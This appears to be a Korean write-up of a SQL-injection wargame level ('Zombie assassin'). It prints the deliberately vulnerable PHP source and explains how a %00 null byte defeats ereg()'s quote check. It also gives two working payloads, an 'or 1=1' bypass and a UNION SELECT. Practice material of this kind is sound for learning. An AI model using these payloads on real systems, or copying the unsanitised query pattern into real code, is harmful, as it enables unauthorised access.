# Lord of SQL Injection No.16 - Zombie assassin
## 문제 출제 의도
1. ereg함수의 취약점의 이해 여부 확인.
## 소스 코드
~~~
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(@ereg("'",$_GET[id])) exit("HeHe"); 
    if(@ereg("'",$_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) solve("zombie_assassin"); 
    highlight_file(__FILE__); 
?>
~~~
## 소스 코드 분석
+ ereg()함수
    * ereg()함수는 다음과 같은 형식을 취한다.
    ~~~
    ereg("찾고자 하는 문자", "임의의 값")
    ~~~
    * ereg 함수는 대 소문자를 구분하며 eregi 함수는 대소문자를 구별하지 않는다.
    * ereg 함수는 취약점 때문에PHP 5.3+부터 사용되지 않고 6.0부터 삭제된다.
    * ereg 함수는 %00(NULL)문자를 만나면 탐색을 종료한다.

## 문제 해결
1. SQL injection
    - 다음과 유사한 방법으로 문제를 해결 가능하다.
    ~~~
    ?id=%00' or 1=1 -- -
    ~~~
2. UNION
    - 다음과 유사한 방법으로 문제를 해결 가능하다.
    ~~~
    ?id=%00' UNION(SELECT 'admin') -- -
    ~~~